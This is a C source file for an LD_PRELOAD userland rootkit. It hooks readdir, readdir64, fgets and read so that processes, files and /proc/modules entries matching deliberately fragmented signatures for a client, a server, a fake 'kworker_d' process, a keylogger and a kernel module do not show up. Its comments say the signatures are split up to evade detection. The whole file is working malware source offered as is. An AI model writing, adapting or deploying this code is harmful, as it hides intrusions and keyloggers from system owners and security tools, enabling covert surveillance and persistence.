#define _GNU_SOURCE
#include <dlfcn.h>
#include <string.h>
#include <dirent.h>
#include <stdio.h>
#include <stdlib.h>
#include <ctype.h>
#include <unistd.h>
#include <fcntl.h>

/**
 * @brief Checks if a given name or string matches obfuscated blacklisted signatures.
 * @details Avoids plain-text detection by splitting target names into fragments 
 *          and validating them using multiple condition checks via strstr.
 * @param name The string, filename, or process name to evaluate.
 * @return int Returns 1 if a signature matches (should be hidden), 0 otherwise.
 */
int check_signature(const char *name) {
    if (name == NULL) return 0;
    
    // Obfuscated client signature check
    if (strstr(name, "cl") != NULL && strstr(name, "nt") != NULL && strstr(name, "li") != NULL) {
        return 1; 
    }
    // Obfuscated server signature check
    if (strstr(name, "se") != NULL && strstr(name, "rv") != NULL && strstr(name, "er") != NULL) {
        return 1; 
    }
    // Direct or keyword checks for kworker_d, keylogger, or kernel modules
    if (strstr(name, "kwork") != NULL || strstr(name, "r_d") != NULL || strstr(name, "keylogger") != NULL || strstr(name, "kernel_module") != NULL) {
        return 1; 
    }
    
    return 0;
}

/**
 * @brief Determines whether a directory entry or process PID should be concealed.
 * @details Evaluates direct signature matches as well as validating PIDs by 
 *          inspecting their corresponding command names inside the virtual /proc filesystem.
 * @param name The entry name or PID string being inspected.
 * @return int Returns 1 if it should be hidden, 0 if it is legitimate.
 */
int should_hide(const char *name) {
    if (check_signature(name)) {
        return 1;
    }

    int is_pid = 1;
    for (int i = 0; name[i] != '\0'; i++) {
        if (!isdigit(name[i])) {
            is_pid = 0;
            break;
        }
    }

    // If it's a PID directory under /proc, check its actual process name
    if (is_pid) {
        char comm_path[256];
        snprintf(comm_path, sizeof(comm_path), "/proc/%s/comm", name);
        FILE *f = fopen(comm_path, "r");
        if (f) {
            char comm_name[256];
            if (fgets(comm_name, sizeof(comm_name), f) != NULL) {
                comm_name[strcspn(comm_name, "\n")] = 0;
                if (check_signature(comm_name)) {
                    fclose(f);
                    return 1;
                }
            }
            fclose(f);
        }
    }

    return 0;
}

/**
 * @brief Hooked implementation of the standard readdir function.
 * @details Intercepts directory stream reading to filter out hidden files, 
 *          folders, and process IDs by invoking should_hide on every entry name.
 * @param dirp Pointer to the directory stream.
 * @return struct dirent* Pointer to the next visible directory entry, or NULL if end/filtered.
 */
struct dirent *readdir(DIR *dirp) {
    static struct dirent *(*orig_readdir)(DIR *) = NULL;
    if (!orig_readdir) {
        orig_readdir = dlsym(RTLD_NEXT, "readdir");
        if (!orig_readdir) return NULL;
    }

    struct dirent *entry;
    while ((entry = orig_readdir(dirp)) != NULL) {
        if (!should_hide(entry->d_name)) {
            return entry;
        }
    }
    return NULL;
}

/**
 * @brief Hooked implementation of the 64-bit readdir64 function.
 * @details Intercepts 64-bit directory stream reading to ensure hidden files 
 *          and process IDs are omitted on modern 64-bit architectures.
 * @param dirp Pointer to the directory stream.
 * @return struct dirent64* Pointer to the next visible 64-bit directory entry, or NULL.
 */
struct dirent64 *readdir64(DIR *dirp) {
    static struct dirent64 *(*orig_readdir64)(DIR *) = NULL;
    if (!orig_readdir64) {
        orig_readdir64 = dlsym(RTLD_NEXT, "readdir64");
        if (!orig_readdir64) return NULL;
    }

    struct dirent64 *entry;
    while ((entry = orig_readdir64(dirp)) != NULL) {
        if (!should_hide(entry->d_name)) {
            return entry;
        }
    }
    return NULL;
}

/**
 * @brief Hooked implementation of the fgets file-reading function.
 * @details Intercepts buffered line reads to inspect if the target file stream 
 *          points to /proc/modules, automatically skipping lines containing the blacklisted module.
 * @param s Buffer where the read string is stored.
 * @param size Maximum number of characters to read.
 * @param stream File stream pointer being read from.
 * @return char* Pointer to the resulting string buffer, or NULL on failure/EOF.
 */
char *fgets(char *s, int size, FILE *stream) {
    static char *(*orig_fgets)(char *, int, FILE *) = NULL;
    if (!orig_fgets) {
        orig_fgets = dlsym(RTLD_NEXT, "fgets");
        if (!orig_fgets) return NULL;
    }

    char *result;
    while (1) {
        result = orig_fgets(s, size, stream);
        if (result == NULL) {
            break;
        }
        
        if (stream != NULL) {
            // Check if the stream is associated with /proc/modules
            char buf[64];
            int fd = fileno(stream);
            snprintf(buf, sizeof(buf), "/proc/self/fd/%d", fd);
            char symlink_target[256];
            ssize_t len = readlink(buf, symlink_target, sizeof(symlink_target) - 1);
            if (len != -1) {
                symlink_target[len] = '\0';
                if (strstr(symlink_target, "modules") != NULL) {
                    if (check_signature(s)) {
                        continue; // Skip line containing our module/signatures
                    }
                }
            }
        }
        break;
    }
    return result;
}

/**
 * @brief Hooked implementation of the low-level read system call.
 * @details Intercepts direct file descriptor reads to catch utilities like 'cat /proc/modules',
 *          parsing the output buffer dynamically and stripping lines that match blacklisted signatures.
 * @param fd File descriptor being read from.
 * @param buf Data buffer to store the read content.
 * @param count Number of bytes requested to read.
 * @return ssize_t Number of bytes read, or -1 on error.
 */
ssize_t read(int fd, void *buf, size_t count) {
    static ssize_t (*orig_read)(int, void *, size_t) = NULL;
    if (!orig_read) {
        orig_read = dlsym(RTLD_NEXT, "read");
        if (!orig_read) return -1;
    }

    ssize_t ret = orig_read(fd, buf, count);
    if (ret > 0) {
        char link_path[64];
        char target[256];
        snprintf(link_path, sizeof(link_path), "/proc/self/fd/%d", fd);
        ssize_t len = readlink(link_path, target, sizeof(target) - 1);
        if (len != -1) {
            target[len] = '\0';
            if (strstr(target, "modules") != NULL) {
                // Null-terminate buffer safely to inspect and filter text contents
                char *temp_buf = (char *)malloc(ret + 1);
                memcpy(temp_buf, buf, ret);
                temp_buf[ret] = '\0';

                if (check_signature(temp_buf)) {
                    // Filter out lines containing the signature
                    char *line = strtok(temp_buf, "\n");
                    char new_buf[4096] = {0};
                    size_t new_len = 0;
                    while (line != NULL) {
                        if (!check_signature(line)) {
                            size_t l_len = strlen(line);
                            if (new_len + l_len + 2 < count) {
                                strcpy(new_buf + new_len, line);
                                new_len += l_len;
                                new_buf[new_len++] = '\n';
                            }
                        }
                        line = strtok(NULL, "\n");
                    }
                    memcpy(buf, new_buf, new_len);
                    ret = new_len;
                }
                free(temp_buf);
            }
        }
    }
    return ret;
}